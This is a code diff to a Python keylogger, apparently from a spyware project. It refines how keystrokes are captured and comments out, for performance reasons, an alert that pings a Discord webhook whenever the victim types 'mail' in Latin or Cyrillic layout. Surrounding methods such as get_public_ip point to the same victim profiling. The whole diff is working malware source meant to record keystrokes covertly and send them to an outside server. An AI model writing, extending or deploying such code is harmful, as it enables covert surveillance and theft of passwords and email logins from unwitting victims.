@@ -41,23 +41,26 @@ class KeyLogger:
             keyboard.Key.delete: ' **[Delete]** ',
             keyboard.Key.print_screen: ' **[Print Screen]** ',
         }
+
         return special_keys.get(key, str(key))
 
     def save_data(self, key):
         try:
-            current_key = str(self.format_special_keys(key.char))
+            if hasattr(key, 'vk') and key.vk in range(96, 105):
+                current_key = str(key.vk - 96)
+            else:
+                current_key = self.format_special_keys(key.char)
         except AttributeError:
-            current_key = self.format_special_keys(key)
+            current_key = str(self.format_special_keys(key))
 
         self.appendlog(current_key)
 
-        if 'mail' in self.log.lower(): #ping everyone when keylog detected word "mail"
-            time.sleep(5)
-            self.send_discord_message(DISCORD_WEBHOOK_URL, "@everyone **__New mail detected! (mail)__**")
-
-        if 'ьфшд' in self.log.lower(): #ping everyone when keylog detected word "mail" (cyrillic)
-            time.sleep(5)
-            self.send_discord_message(DISCORD_WEBHOOK_URL, "@everyone **__New mail detected! (ьфшд)__**")
+# DISABLED BY DEFAULT(bc of lags) but u can enable it if u want
+#        if 'mail' in self.log.lower(): #ping everyone when keylog detected word "mail"
+#            self.send_discord_message(DISCORD_WEBHOOK_URL, "@everyone **__New mail detected! (mail)__**")
+#
+#        if 'ьфшд' in self.log.lower(): #ping everyone when keylog detected word "mail" (cyrillic)
+#            self.send_discord_message(DISCORD_WEBHOOK_URL, "@everyone **__New mail detected! (ьфшд)__**")
 
     def get_public_ip(self):
         try:
